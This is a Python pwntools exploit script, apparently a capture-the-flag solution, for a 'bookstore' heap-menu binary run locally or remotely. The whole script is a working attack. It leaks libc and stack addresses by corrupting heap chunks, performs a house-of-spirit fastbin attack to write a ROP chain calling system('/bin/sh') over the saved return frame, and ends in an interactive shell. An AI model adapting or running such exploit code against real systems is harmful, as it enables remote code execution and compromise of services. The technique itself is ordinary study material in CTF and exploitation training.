from pwn import *
import sys
if len(sys.argv) < 2:
	p = process("./bookstore")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./bookstore")
else:
	p = remotep(ip,port)
	libc = ELF("libc_64.so")
	elf = ELF("./bookstore")

def add(name,size,content):
	p.sendlineafter("Your choice:\n","1")
	p.sendafter("the author name?\n",name)
	p.sendlineafter("the book name?\n",str(size))
	p.sendafter("of the book?\n",content)
	p.recvuntil("Done!\n")

def add2(name,size,content):
	p.sendafter("Your choice:\n",p64(0x31)+p64(0x21))
	p.sendafter("the author name?\n",name)
	p.sendlineafter("the book name?\n",str(size))
	p.sendafter("of the book?\n",content)
	p.recvuntil("Done!\n")

def read(index):
	p.sendlineafter("Your choice:\n","3")
	p.sendlineafter("want to sell?",str(index))
	return p.recvuntil("1.add a book",drop = True)

def free(index):
	p.sendlineafter("Your choice:\n","2")
	p.sendlineafter("want to sell?",str(index))
	p.recvuntil("Done!\n")
	
def debugf():
	gdb.attach(p,"b *0x400887")


#leak_libc
context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
add("0\n",0x10,"a\n")
add("1\n",0x50,"b\n")
add("2\n",0x50,"c"*0x20 + (p64(0x90)+p64(0x31))+"\n")
free(0)
add("0\n",0,"a"*0x10+p64(0)+p64(0x91)+"\n")
free(1)
add("1\n",0x50,"b\n")
info = read(2)
leak_addr = u64(info.split("Bookname:")[1].strip("\n").ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))

#leak_stack
book_addr = 0x602060
add(p64(0)+p64(0x41)+"\n",0x10,"a\n")
add(p64(0)+p64(0x21)+"\n",0x10,"b\n")
add("2\n",0x10,"c\n")
free(5)
free(4)
add("0\n",0,"a"*0x10+p64(0)+p64(0x21)+p64(book_addr+160)+"\n")
add("0\n",0,"\n")
add(p64(0)+p64(0x21)+"cccccc\n",0,p64(0)*2+p64(libc.symbols["environ"])+(p64(0x21)+p64(0))*2+p64(book_addr+160+0x10)+(p64(0)+p64(0x21))*2+p64(book_addr+224)+"\n")
info = read(4)
stack_addr = u64(info.split("Bookname:")[1].strip("\n").ljust(8,"\x00"))
rbp_addr = stack_addr - (0x7ffe393dc7d8 - 0x7ffe393dc6e0)
print hex(stack_addr)
log.success("main_rbp:"+hex(rbp_addr))

#house of spirit
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
pop_rdi_ret = 0x0000000000400cd3
free(6)
free(5)
read(0)
add("0\n",0,"a"*0x20+p64(0)+p64(0x21)+p64(rbp_addr-0x10)+"\n")
add("0\n",0,"a"*0x20+p64(0)+p64(0x21)+"\n")
add2("0\n",0,"junkjunk"+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)+"\n")
p.sendlineafter("Your choice:\n","4")
p.interactive()
